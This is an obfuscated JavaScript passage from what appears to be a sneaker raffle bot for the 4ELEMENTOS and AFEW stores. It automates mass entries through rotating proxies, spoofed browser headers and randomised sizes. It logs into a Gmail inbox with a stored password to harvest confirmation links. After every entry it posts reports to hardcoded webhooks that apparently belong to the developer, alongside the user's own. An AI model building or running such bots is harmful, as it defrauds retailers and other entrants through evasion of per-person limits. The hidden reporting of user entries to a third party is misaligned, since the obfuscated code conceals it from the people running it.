                        } catch {
                            _0x192aef = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        _0x57fa03(_0x7e7f73['name'] + '\x20Task\x20' + (_0x8baab8 + 0x1) + '\x20/\x20' + _0x147104['length'] + '\x20||\x20File:\x20' + _0x5b46f0 + '\x20Proxies:\x20' + _0x519e9c);
                        var _0x1844e6 = [
                            '40',
                            '40,5',
                            '41',
                            '42',
                            '42,5',
                            '43',
                            '44',
                            '45',
                            '45,5',
                            '46',
                            '47',
                            '47,5',
                            '48'
                        ], _0x1fbbf7 = Math['round'](Math['random']() * (_0x1844e6['length'] - 0x1));
                        _0x147104[_0x8baab8]['Size'] == 'RANDOM' && (_0x147104[_0x8baab8]['Size'] = _0x1844e6[_0x1fbbf7]);
                        var _0x495ba8 = Math['round'](Math['random']() * (_0x2db609['length'] - 0x1)), _0xa799f1 = _0x2db609[_0x495ba8]['split'](':'), _0x171592;
                        try {
                            _0x171592 = await _0x3df2da['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0xa799f1[0x0] + ':' + _0xa799f1[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x171592 = await _0x3df2da['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0xa799f1[0x0] + ':' + _0xa799f1[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            console['log'](_0x1c7496() + '\x20[' + _0x7e7f73['name'] + ']\x20Task\x20' + (_0x8baab8 + 0x1) + '\x20:\x20Getting\x20Session');
                            const _0xc295c0 = await _0x171592['newPage']();
                            await _0xc295c0['authenticate']({
                                'username': '' + _0xa799f1[0x2],
                                'password': '' + _0xa799f1[0x3]
                            }), await _0xc295c0['setRequestInterception'](!![]), _0xc295c0['on']('request', _0x2d43df => {
                                _0x2d43df['resourceType']() === 'image' || _0x2d43df['resourceType']() === 'font' || _0x2d43df['resourceType']() === 'media' ? _0x2d43df['abort']() : _0x2d43df['continue']();
                            }), await _0xc295c0['goto'](_0x147104[_0x8baab8]['Url'], { 'waitUntil': 'networkidle2' }), console['log'](_0x1c7496() + '\x20[' + _0x7e7f73['name'] + ']\x20Task\x20' + (_0x8baab8 + 0x1) + '\x20:\x20Starting\x20Entry'), await _0xc295c0['waitForSelector']('#accept-all-gdpr'), await _0xc295c0['click']('#accept-all-gdpr'), await _0xc295c0['waitForSelector']('#raffles-product'), await _0x37731a(0x3e8), await _0xc295c0['$eval']('#raffles-product', _0x3a8591 => _0x3a8591['click']()), await _0x37731a(0x1388), await _0xc295c0['waitForSelector']('.fancybox-inner\x20>\x20iframe');
                            var _0x41a634 = await _0xc295c0['$']('.fancybox-inner\x20>\x20iframe'), _0x4447ca = await _0x41a634['contentFrame']();
                            console['log'](_0x1c7496() + '\x20[' + _0x7e7f73['name'] + ']\x20Task\x20' + (_0x8baab8 + 0x1) + '\x20:\x20Checking\x20Information'), await _0x4447ca['waitForSelector']('input[name=\x22sm-form-email\x22]'), await _0x37731a(0x1f4), await _0x4447ca['type']('input[name=\x22sm-form-email\x22]', _0x147104[_0x8baab8]['Email']), await _0x37731a(0xc8), await _0x4447ca['type']('input[name=\x22sm-form-name\x22]', _0x147104[_0x8baab8]['FirstName'] + '\x20' + _0x147104[_0x8baab8]['LastName']), await _0x37731a(0xc8), await _0x4447ca['type']('input[name=\x22sm-form-street\x22]', _0x147104[_0x8baab8]['Address1'] + '\x20' + _0x147104[_0x8baab8]['HouseNumber'] + '\x20' + _0x147104[_0x8baab8]['Address2']), await _0x37731a(0xc8), await _0x4447ca['type']('input[name=\x22sm-form-city\x22]', _0x147104[_0x8baab8]['City']), await _0x37731a(0xc8), await _0x4447ca['type']('input[name=\x22sm-form-province\x22]', _0x147104[_0x8baab8]['State']), await _0x37731a(0xc8), await _0x4447ca['type']('input[name=\x22sm-form-zip\x22]', _0x147104[_0x8baab8]['Zip']), await _0x37731a(0xc8), await _0x4447ca['type']('input[name=\x22sm-form-country\x22]', _0x147104[_0x8baab8]['Country']), await _0x37731a(0xc8), await _0x4447ca['type']('input[name=\x22sm-form-phone\x22]', _0x147104[_0x8baab8]['Phone']), await _0x37731a(0xc8), await _0x4447ca['type']('input[name=\x22sm-cst.instagram_user\x22]', _0x147104[_0x8baab8]['Follower']), await _0x37731a(0xc8), await _0x4447ca['type']('input[name=\x22sm-cst.size\x22]', _0x147104[_0x8baab8]['Size']), await _0x37731a(0x1f4), await _0x4447ca['click']('.icheckbox_simple-custom.icheckbox--CONSENT'), await _0x37731a(0x1f4), await _0x4447ca['click']('.icheckbox_simple-custom'), await _0x37731a(0x1f4), console['log'](_0x1c7496() + '\x20[' + _0x7e7f73['name'] + ']\x20Task\x20' + (_0x8baab8 + 0x1) + '\x20:\x20Sending\x20Request'), await _0x4447ca['$eval']('form', _0x5929fb => _0x5929fb['submit']()), console['log'](_0x7ff36['green'](_0x1c7496() + '\x20[' + _0x7e7f73['name'] + ']\x20Task\x20' + (_0x8baab8 + 0x1) + '\x20:\x20Raffle\x20Entered!')), _0x192aef = '';
                            var _0x2e12ba = await _0x5c5001(_0x147104[_0x8baab8], _0x7e7f73, 'dev', ![]), _0x1510d8 = await _0x5c5001(_0x147104[_0x8baab8], _0x7e7f73, 'pub', ![]);
                            const _0x5b2cb9 = {
                                'succesDEVMSG': { 'embeds': [_0x2e12ba] },
                                'succesPUBMSG': { 'embeds': [_0x1510d8] }
                            };
                            try {
                                _0x15bf3f['webhook'] != undefined && _0x15bf3f['webhook'] != '' && await _0x4160b0(_0x15bf3f['webhook'], _0x5b2cb9['succesDEVMSG']), await _0x37731a(0xc8), await _0x4160b0(_0x4ebf40, _0x5b2cb9['succesDEVMSG']), await _0x37731a(0xc8), await _0x4160b0(_0xd6338c, _0x5b2cb9['succesPUBMSG']);
                            } catch (_0xdddbf4) {
                                console['log'](_0x7ff36['yellow'](_0x1c7496() + '\x20[' + _0x7e7f73['name'] + ']\x20Task\x20' + (_0x8baab8 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0xdddbf4));
                            }
                        } catch (_0x1a33ab) {
                            console['log'](_0x7ff36['red'](_0x1c7496() + '\x20[' + _0x7e7f73['name'] + ']\x20Task\x20' + (_0x8baab8 + 0x1) + '\x20:\x20' + _0x1a33ab)), _0x516b9f = '' + _0x1a33ab;
                            var _0x47da21 = await _0x5c5001(_0x147104[_0x8baab8], _0x7e7f73, 'dev', !![], _0x516b9f), _0x2e12ba = await _0x5c5001(_0x147104[_0x8baab8], _0x7e7f73, 'dev', ![]), _0x1510d8 = await _0x5c5001(_0x147104[_0x8baab8], _0x7e7f73, 'pub', ![]);
                            const _0x25722e = {
                                'succesDEVMSG': { 'embeds': [_0x2e12ba] },
                                'succesPUBMSG': { 'embeds': [_0x1510d8] }
                            };
                            _0x25722e['errorDEV'] = { 'embeds': [_0x47da21] }, _0x15bf3f['webhook'] != undefined && _0x15bf3f['webhook'] != '' && await _0x4160b0(_0x15bf3f['webhook'], _0x25722e['errorDEV']), await _0x4160b0(_0x3ce78e, _0x25722e['errorDEV']), _0x1a33ab != 'Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.' && (_0x192aef = 'yes');
                        } finally {
                            _0x171592['close']();
                            if (_0x192aef == 'yes' && _0x48575b != 0x5 && _0x516b9f != 'Size\x20Not\x20Found') {
                                console['log'](_0x7ff36['red'](_0x1c7496() + '\x20[' + _0x7e7f73['name'] + ']\x20Task\x20' + (_0x8baab8 + 0x1) + '\x20:\x20Retrying\x20(' + _0x48575b + '\x20/\x205)\x20')), _0x8baab8 = _0x8baab8 - 0x1, _0x48575b = _0x48575b + 0x1;
                                continue;
                            }
                            _0x192aef == 'yes' && _0x48575b >= 0x5 && (_0x17fcb0(_0x147104[_0x8baab8], _0x7e7f73), _0x192aef = 'no', _0x48575b = 0x0), console['log'](_0x1c7496() + '\x20[' + _0x7e7f73['name'] + ']\x20Waiting\x20for\x20' + _0x15bf3f['delay'] + '\x20ms'), await _0x37731a(_0x15bf3f['delay']);
                        }
                    }
                }
            },
            {
                'name': '4ELEMENTOS\x20Link\x20Verification',
                'store': '4ELEMENTOS',
                'logo': 'https://cdn.lovesavingsgroup.com/logos/4elementos.jpg',
                'function': async function (_0x305929, _0x43c998) {
                    var _0x13d95a = [];
                    async function _0x4fbc17() {
                        var _0x27f6b5 = new _0x3451ed({
                            'user': _0x15bf3f['masterMail'],
                            'password': _0x15bf3f['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x1d9684(_0xb07ec3) {
                            _0x27f6b5['openBox']('INBOX', ![], _0xb07ec3);
                        }
                        _0x27f6b5['once']('ready', function () {
                            _0x1d9684(function (_0x2614d7, _0x18346c) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x2614d7)
                                    throw _0x2614d7;
                                _0x27f6b5['seq']['search'](['UNSEEN'], function (_0x243d9e, _0x2e02ed) {
                                    if (!_0x2e02ed || !_0x2e02ed['length'])
                                        console['log'](_0x1c7496() + '\x20[' + _0x305929['name'] + ']\x20No\x20mails\x20found'), _0x27f6b5['end']();
                                    else {
                                        var _0x1befe8 = _0x27f6b5['seq']['fetch'](_0x2e02ed, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x1befe8['on']('message', function (_0x4c725a, _0x4b686d) {
                                            var _0x502c94 = '(#' + _0x4b686d + ')\x20';
                                            _0x4c725a['on']('body', function (_0x18e8fc, _0x31f88a) {
                                                _0x34a37a(_0x18e8fc, (_0x5ef77c, _0x3a6cca) => {
                                                    if (_0x3a6cca['subject'] == 'Confirm\x20your\x20subscription\x20to\x20the\x20Raffle\x20||\x20Confirma\x20tu\x20suscripción\x20al\x20Raffle') {
                                                        var _0x455b13 = _0x3a6cca['html']['split']('\x0a');
                                                        for (var _0x52ff42 = 0x0; _0x52ff42 < _0x455b13['length']; _0x52ff42++) {
                                                            if (_0x455b13[_0x52ff42]['includes']('salesmanago') && _0x455b13[_0x52ff42]['includes']('<td') && _0x455b13[_0x52ff42]['includes']('href')) {
                                                                var _0x7cd5b1 = _0x455b13[_0x52ff42]['split']('href=\x22'), _0x21b763 = _0x7cd5b1[0x1]['split']('\x22')[0x0];
                                                                _0x13d95a['push'](_0x21b763);
                                                                break;
                                                            }
                                                        }
                                                    }
                                                });
                                            }), _0x4c725a['once']('end', function () {
                                            });
                                        }), _0x1befe8['once']('error', function (_0x475fba) {
                                            console['log']('Fetch\x20error:\x20' + _0x475fba);
                                        }), _0x1befe8['once']('end', function () {
                                            _0x27f6b5['end']();
                                        });
                                    }
                                });
                            });
                        }), _0x27f6b5['once']('error', function (_0x4f8eb8) {
                            console['log'](_0x7ff36['red'](_0x4f8eb8['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox');
                        }), _0x27f6b5['once']('end', async function () {
                        }), _0x27f6b5['connect']();
                    }
                    async function _0x447f6e(_0x5a08cb, _0xbeb6ac, _0x47bf28) {
                        for (var _0x4e1621 = 0x0; _0x4e1621 < _0xbeb6ac['length']; _0x4e1621++) {
                            async function _0x5cb13b(_0x4c3523, _0x4ecea1, _0x5b8c7d, _0x27e5bd, _0x1c7d64) {
                                var _0x27452d, _0x3e9bdc = {}, _0x425134 = [], _0x51981f = {}, _0x1ebf7f = [
                                    '40',
                                    '40,5',
                                    '41',
                                    '42',
                                    '42,5',
                                    '43',
                                    '44',
                                    '45',
                                    '45,5',
                                    '46',
                                    '47',
                                    '47,5',
                                    '48'
                                ], _0x151f1a = Math['round'](Math['random']() * (_0x1ebf7f['length'] - 0x1));
                                _0x27e5bd[_0x4c3523]['Size'] == 'RANDOM' && (_0x27e5bd[_0x4c3523]['Size'] = _0x1ebf7f[_0x151f1a]);
                                !_0x27e5bd && (_0x27e5bd = {});
                                if (_0x15bf3f['useRandomProxy'] = ![])
                                    var _0x44516c = _0x1c7d64[_0x4c3523]['split'](':');
                                else
                                    var _0x423f23 = Math['round'](Math['random']() * (_0x1c7d64['length'] - 0x1)), _0x44516c = _0x1c7d64[_0x423f23]['split'](':');
                                var _0x5c75f5 = {
                                    'jar': _0x50eb26,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x5b8c7d['url'],
                                    'headers': _0x5b8c7d['headers'],
                                    'body': JSON['stringify'](_0x3e9bdc),
                                    'proxy': 'http://' + _0x44516c[0x2] + ':' + _0x44516c[0x3] + '@' + _0x44516c[0x0] + ':' + _0x44516c[0x1]
                                };
                                return _0x4ecea1 != 'ver' && (_0x5c75f5['url'] = _0x5b8c7d['url'], _0x5c75f5['headers'] = _0x5b8c7d['headers']), _0x4ecea1 == 'ver' && (_0x5c75f5['method'] = 'GET', _0x5c75f5['url'] = _0x27e5bd[_0x4c3523]), new Promise(function (_0x56b6d0, _0xd6354f) {
                                    callback = async (_0x12913f, _0x19bf61, _0x33be57) => {
                                        if (!_0x12913f && _0x19bf61['statusCode'] == 0xca || !_0x12913f && _0x19bf61['statusCode'] == 0xc8) {
                                            if (_0x4ecea1 != 'ver') {
                                                var _0x3f0d90 = await _0x5c5001(_0x27e5bd[_0x4c3523], _0x5b8c7d, 'dev', ![]), _0xbc88ae = await _0x5c5001(_0x27e5bd[_0x4c3523], _0x5b8c7d, 'pub', ![]);
                                                const _0x253a97 = {
                                                    'succesDEVMSG': { 'embeds': [_0x3f0d90] },
                                                    'succesPUBMSG': { 'embeds': [_0xbc88ae] }
                                                };
                                                if (_0x15bf3f['webhook'] != undefined && _0x15bf3f['webhook'] != '')
                                                    try {
                                                        await _0x4160b0(_0x15bf3f['webhook'], _0x253a97['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0x37731a(0xc8), await _0x4160b0(_0x4ebf40, _0x253a97['succesDEVMSG']), await _0x37731a(0xc8);
                                                try {
                                                    await _0x4160b0(_0xd6338c, _0x253a97['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0x5879e0(_0x27e5bd[_0x4c3523], _0x5b8c7d);
                                            }
                                            _0x56b6d0(console['log'](_0x7ff36['green'](_0x1c7496() + '\x20[' + _0x5b8c7d['name'] + ']\x20Task\x20' + (_0x4c3523 + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x4ecea1 != 'ver') {
                                                var _0xc90f52 = '' + _0x12913f, _0x444782 = await _0x5c5001(_0x27e5bd[_0x4c3523], _0x5b8c7d, 'dev', !![], _0xc90f52), _0x48bc8c = {};
                                                _0x48bc8c['errorDEV'] = { 'embeds': [_0x444782] }, _0x17fcb0(_0x27e5bd[_0x4c3523], _0x5b8c7d), _0x15bf3f['webhook'] != undefined && _0x15bf3f['webhook'] != '' && await _0x4160b0(_0x15bf3f['webhook'], _0x48bc8c['errorDEV']), await _0x4160b0(_0x3ce78e, _0x48bc8c['errorDEV']);
                                            }
                                            _0xd6354f(console['log'](_0x7ff36['red'](_0x1c7496() + '\x20[' + _0x5b8c7d['name'] + ']\x20Task\x20' + (_0x4c3523 + 0x1) + ':\x20' + _0x12913f)));
                                        }
                                    };
                                    try {
                                        _0x4ecea1 != 'ver' ? console['log'](_0x1c7496() + '\x20[' + _0x5b8c7d['name'] + ']\x20Task\x20' + (_0x4c3523 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x3e9bdc['data']['attributes']['email']) : console['log'](_0x1c7496() + '\x20[' + _0x5b8c7d['name'] + ']\x20Task\x20' + (_0x4c3523 + 0x1) + ':\x20Fetching\x20Response'), _0x5b6a7b(_0x5c75f5, callback);
                                    } catch (_0xdc0d9b) {
                                        console['log'](_0x1c7496() + '\x20Task\x20' + (_0x4c3523 + 0x1) + ':\x20' + _0xdc0d9b);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x5cb13b(_0x4e1621, 'ver', _0x5a08cb, _0xbeb6ac, _0x47bf28), console['log'](_0x1c7496() + '\x20[' + _0x5a08cb['name'] + ']\x20Sleeping\x20for\x20' + _0x15bf3f['delay'] + '\x20ms'), await _0x37731a(_0x15bf3f['delay']);
                            } catch (_0x374f8a) {
                            }
                        }
                    }
                    try {
                        _0x4fbc17(), await _0x37731a(0xfa0), console['log']('Found\x20' + _0x13d95a['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..');
                    }
                    await _0x447f6e(_0x305929, _0x13d95a, _0x43c998);
                }
            }
        ]
    },
    {
        'name': 'AFEW\x20Store',
        'modules': [{
            'name': 'AFEW\x20Raffle\x20Entries',
            'store': 'AFEW',
            'logo': 'https://d19kzigy6tpscu.cloudfront.net/media/CACHE/images/logo_thumbnail/afew_logo_100x100_1647428869.png',
            'function': async function (_0x47627e, _0x266aa3, _0x4af925) {
                for (var _0x5d6369 = 0x0; _0x5d6369 < _0x266aa3['length']; _0x5d6369++) {
                    _0x15bf3f['AfewDelay'] = _0x15bf3f['delay'];
                    var _0x95a13f;
                    if (_0x3ff5f9 != 'yes')
                        var _0x3ff5f9 = '', _0x1836ce = 0x0;
                    var _0x136486 = _0x266aa3[_0x5d6369]['Url'];
                    _0x57fa03(_0x47627e['name'] + '\x20Task\x20' + (_0x5d6369 + 0x1) + '\x20/\x20' + _0x266aa3['length'] + '\x20||\x20File:\x20' + _0x5b46f0 + '\x20Proxies:\x20' + _0x519e9c);
                    try {
                        await _0x412246(_0x266aa3, _0x5d6369);
                    } catch {
                        _0x3ff5f9 = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    async function _0x4295f4(_0x3eb55c) {
                        const _0x43d459 = _0x241ca2['readFileSync']('../successful-tasks.csv', 'utf8'), _0x15d31c = _0x34efb8['parse'](_0x43d459, { 'header': !![] })['data'];
                        let _0xea88d = ![];
                        for (var _0x16d769 of _0x15d31c) {
                            if (_0x16d769['Url'] == _0x3eb55c['Url'] && _0x16d769['Email'] == _0x3eb55c['Email']) {
                                _0xea88d = !![];
                                break;
                            }
                        }
                        return _0xea88d;
                    }
                    if (await _0x4295f4(_0x266aa3[_0x5d6369]) == !![]) {
                        console['log'](_0x1c7496() + '\x20[' + _0x47627e['name'] + ']\x20Task\x20' + (_0x5d6369 + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task');
                        continue;
                    }
                    var _0x1865ce = await _0x5c5001(_0x266aa3[_0x5d6369], _0x47627e, 'dev', ![]), _0x1dae5e = await _0x5c5001(_0x266aa3[_0x5d6369], _0x47627e, 'pub', ![]);
                    const _0x41253f = {
                        'succesDEVMSG': { 'embeds': [_0x1865ce] },
                        'succesPUBMSG': { 'embeds': [_0x1dae5e] }
                    };
                    if (_0x266aa3[_0x5d6369]['Email'] == '' || _0x266aa3[_0x5d6369]['FirstName'] == '' || _0x266aa3[_0x5d6369]['LastName'] == '' || _0x266aa3[_0x5d6369]['Country'] == '' || _0x266aa3[_0x5d6369]['Size'] == '' || _0x266aa3[_0x5d6369]['Address1'] == '' || _0x266aa3[_0x5d6369]['Zip'] == '') {
                        console['log'](_0x1c7496() + '\x20[' + _0x47627e['name'] + ']\x20Task\x20' + (_0x5d6369 + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x15bf3f['useRandomProxy'] = ![])
                        var _0x2f8633 = _0x4af925[_0x5d6369]['split'](':');
                    else
                        var _0x5d1c13 = Math['round'](Math['random']() * (_0x4af925['length'] - 0x1)), _0x2f8633 = _0x4af925[_0x5d1c13]['split'](':');
                    const _0xdc633 = await _0x3df2da['launch']({
                        'headless': !![],
                        'args': [
                            '--proxy-server=' + _0x2f8633[0x0] + ':' + _0x2f8633[0x1],
                            '--no-sandbox',
                            '--disable-setuid-sandbox'
                        ]
                    });
                    try {
                        var _0x344f3d = JSON['parse'](_0x241ca2['readFileSync']('sizes.json', 'utf-8')), _0x136486 = _0x266aa3[_0x5d6369]['Url'], _0x26d7dd = _0x266aa3[_0x5d6369]['Size'], _0x3ebf3c;
                        async function _0x5a0f27() {
                            var _0x1042f0 = new _0x1dca6d['CookieJar']();
                            console['log'](_0x1c7496() + '\x20[' + _0x47627e['name'] + ']\x20Task\x20' + (_0x5d6369 + 0x1) + '\x20:\x20Getting\x20Session');
                            var _0x5818a6;
                            let _0x36bacb = {
                                'method': 'GET',
                                'cookieJar': _0x1042f0,
                                'headers': {
                                    'Connection': 'keep-alive',
                                    'Pragma': 'no-cache',
                                    'Cache-Control': 'no-cache',
                                    'sec-ch-ua': '\x22Google\x20Chrome\x22;v=\x2289\x22,\x20\x22Chromium\x22;v=\x2289\x22,\x20\x22;Not\x20A\x20Brand\x22;v=\x2299\x22',
                                    'sec-ch-ua-mobile': '?0',
                                    'DNT': '1',
                                    'Upgrade-Insecure-Requests': '1',
                                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                                    'cookies': '',
                                    'Sec-Fetch-Site': 'none',
                                    'Sec-Fetch-Mode': 'navigate',
                                    'Sec-Fetch-User': '?1',
                                    'Sec-Fetch-Dest': 'document',
                                    'Accept-Language': 'en-US,en;q=0.9'
                                },
                                'proxy': 'http://' + _0x2f8633[0x2] + ':' + _0x2f8633[0x3] + '@' + _0x2f8633[0x0] + ':' + _0x2f8633[0x1]
                            }, _0x3563d0 = _0x136486['replace']('de.afew-store.com', 'en.afew-store.com')['replace']('en.afew-store.com', 'raffles.afew-store.com'), _0x2cca2c = _0x3563d0 + '.json', _0x9254c0 = await _0x8372f0(_0x2cca2c);
                            console['log'](_0x1c7496() + '\x20[' + _0x47627e['name'] + ']\x20Task\x20' + (_0x5d6369 + 0x1) + '\x20:\x20Getting\x20Variants');
                            let _0x1e9469 = _0x9254c0['data']['product']['variants'];
                            if (_0x26d7dd != 'RANDOM') {
                                if (_0x1e9469[0x1]['option1']['includes']('W')) {
                                    const _0x51cb3e = _0x344f3d['women']['find'](_0x314ca8 => _0x314ca8['EUsize'] === _0x26d7dd);
                                    _0x51cb3e && (_0x26d7dd = _0x51cb3e['size']);
                                } else {
                                    if (_0x1e9469[0x1]['option1']['includes']('Y')) {
                                        const _0x5e5352 = _0x344f3d['GS']['find'](_0x438fce => _0x438fce['EUsize'] === _0x26d7dd);
                                        _0x5e5352 && (_0x26d7dd = _0x5e5352['size']);
                                    } else {
                                        const _0x58bd1e = _0x344f3d['men']['find'](_0x3e2070 => _0x3e2070['EUsize'] === _0x26d7dd);
                                        _0x58bd1e && (_0x26d7dd = _0x58bd1e['size']);
                                    }
                                }
                                for (var _0x19e0b7 of _0x1e9469) {
                                    _0x19e0b7['option1'] == _0x26d7dd && (_0x5818a6 = _0x19e0b7['id']);
                                }
                            } else {
                                var _0x36496b = Math['round'](Math['random']() * (_0x1e9469['length'] - 0x1));
                                _0x5818a6 = _0x1e9469[_0x36496b]['id'];
                            }
                            console['log'](_0x1c7496() + '\x20[' + _0x47627e['name'] + ']\x20Task\x20' + (_0x5d6369 + 0x1) + '\x20:\x20Adding\x20to\x20Cart'), addToCart = await _0x8372f0('https://raffles.afew-store.com/cart/' + _0x5818a6 + ':1'), _0x3ebf3c = addToCart['request']['res']['responseUrl'];
                        }
                        try {
                            await _0x5a0f27();
                        } catch (_0x1d0ae3) {
                            if (_0x1d0ae3['message']['includes']('TUNN'))
                                throw new Error('Proxy\x20Connection\x20Error');
                            throw new Error('Proxy\x20Error');
                        }
                        const _0x7bf828 = await _0xdc633['newPage']();
                        await _0x7bf828['setDefaultNavigationTimeout'](0x1d4c0), await _0x7bf828['authenticate']({
                            'username': '' + _0x2f8633[0x2],
                            'password': '' + _0x2f8633[0x3]
                        }), await _0x7bf828['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x7bf828['setRequestInterception'](!![]), _0x7bf828['on']('request', _0x391cbf => {
                            _0x391cbf['resourceType']() === 'image' || _0x391cbf['resourceType']() === 'font' || _0x391cbf['resourceType']() === 'media' ? _0x391cbf['abort']() : _0x391cbf['continue']();
                        });
                        try {
                            await _0x7bf828['goto'](_0x3ebf3c, { 'waituntil': 'networkidle0' });
                        } catch {
                            throw new Error('Connection\x20Error');
                        }
                        console['log'](_0x1c7496() + '\x20[' + _0x47627e['name'] + ']\x20Task\x20' + (_0x5d6369 + 0x1) + '\x20:\x20Submitting\x20Information');
                        try {
                            await _0x7bf828['waitForSelector']('#checkout_email');
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x7bf828['type']('#checkout_email', '' + _0x266aa3[_0x5d6369]['Email']), await _0x37731a(0x320), await _0x7bf828['select']('#checkout_shipping_address_country', '' + _0x266aa3[_0x5d6369]['Country']), await _0x7bf828['waitForTimeout'](0x258), await _0x7bf828['type']('#checkout_shipping_address_first_name', '' + _0x266aa3[_0x5d6369]['FirstName']), await _0x7bf828['waitForTimeout'](0x320), await _0x7bf828['type']('#checkout_shipping_address_last_name', '' + _0x266aa3[_0x5d6369]['LastName']), await _0x7bf828['waitForTimeout'](0x2bc), await _0x7bf828['type']('#checkout_shipping_address_address1', _0x266aa3[_0x5d6369]['Address1'] + '\x20' + _0x266aa3[_0x5d6369]['HouseNumber']), await _0x7bf828['waitForTimeout'](0x2bc), await _0x7bf828['type']('#checkout_shipping_address_address2', '' + _0x266aa3[_0x5d6369]['Address2']), await _0x7bf828['waitForTimeout'](0x2bc);
                        _0x266aa3[_0x5d6369]['Postcode'] == undefined ? await _0x7bf828['type']('#checkout_shipping_address_zip', '' + _0x266aa3[_0x5d6369]['Zip']) : await _0x7bf828['type']('#checkout_shipping_address_zip', '' + _0x266aa3[_0x5d6369]['Postcode']);
                        await _0x7bf828['waitForTimeout'](0x2bc), await _0x7bf828['type']('#checkout_shipping_address_city', '' + _0x266aa3[_0x5d6369]['City']), await _0x7bf828['waitForTimeout'](0x2bc), console['log'](_0x1c7496() + '\x20[' + _0x47627e['name'] + ']\x20Task\x20' + (_0x5d6369 + 0x1) + '\x20:\x20Getting\x20Shipping'), _0x7bf828['evaluate'](() => {
                            const _0x5d79c6 = document['querySelector']('#continue_button');
                            for (var _0x21a57c = 0x0; _0x21a57c < 0x5; _0x21a57c++) {
                                if (_0x5d79c6) {
                                    _0x5d79c6['click'](), _0x5d79c6['click']();
                                    break;
                                } else
                                    _0x37731a(0xfa0);
                            }
                        }), await _0x7bf828['waitForTimeout'](0x9c4);
                        try {
                            await _0x7bf828['waitForSelector']('div.radio-wrapper', { 'timeout': 0x186a0 });
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x7bf828['waitForSelector']('form[data-shipping-method-form=\x22true\x22]'), await _0x7bf828['$eval']('form[data-shipping-method-form=\x22true\x22]', _0x4fafb8 => _0x4fafb8['submit']()), await _0x7bf828['waitForTimeout'](0x7d0), console['log'](_0x1c7496() + '\x20[' + _0x47627e['name'] + ']\x20Task\x20' + (_0x5d6369 + 0x1) + '\x20:\x20Finishing\x20Entry');
                        try {
                            await _0x7bf828['waitForSelector']('div[data-payment-subform=\x22required\x22]', { 'timeout': 0x186a0 });
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x37731a(0x3e8), await _0x7bf828['$eval']('body\x20>\x20div.content\x20>\x20div\x20>\x20div\x20>\x20main\x20>\x20div.step\x20>\x20div\x20>\x20form', _0x17dad0 => _0x17dad0['submit']()), await _0x37731a(0x3e8);
                        try {
                            await _0x7bf828['waitForSelector']('div[data-last-step=\x22true\x22]', { 'timeout': 0x186a0 });
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x7bf828['$eval']('body\x20>\x20div.content\x20>\x20div\x20>\x20div\x20>\x20main\x20>\x20div.step\x20>\x20form', _0x59fc25 => _0x59fc25['submit']());
                        try {
                            await _0x7bf828['waitForSelector']('div[data-step=\x22thank_you\x22]'), _0x3ff5f9 = 'no', _0x5879e0(_0x266aa3[_0x5d6369], _0x47627e), console['log'](_0x7ff36['green'](_0x1c7496() + '\x20[' + _0x47627e['name'] + ']\x20Task\x20' + (_0x5d6369 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            if (_0x15bf3f['webhook'] != undefined && _0x15bf3f['webhook'] != '')
                                try {
                                    await _0x4160b0(_0x15bf3f['webhook'], _0x41253f['succesDEVMSG']);
                                } catch {
                                }
                            await _0x37731a(0xc8), await _0x4160b0(_0x4ebf40, _0x41253f['succesDEVMSG']), await _0x37731a(0xc8);
                            try {
                                await _0x4160b0(_0xd6338c, _0x41253f['succesPUBMSG']);
                            } catch {
                            }
                        } catch (_0x33193a) {
                            throw new Error('Connection\x20Error\x20Fetching\x20Response');
                        }
                    } catch (_0xec6c95) {
                        _0xec6c95['message']['includes']('selector') && (_0xec6c95 = 'Connection\x20Error');
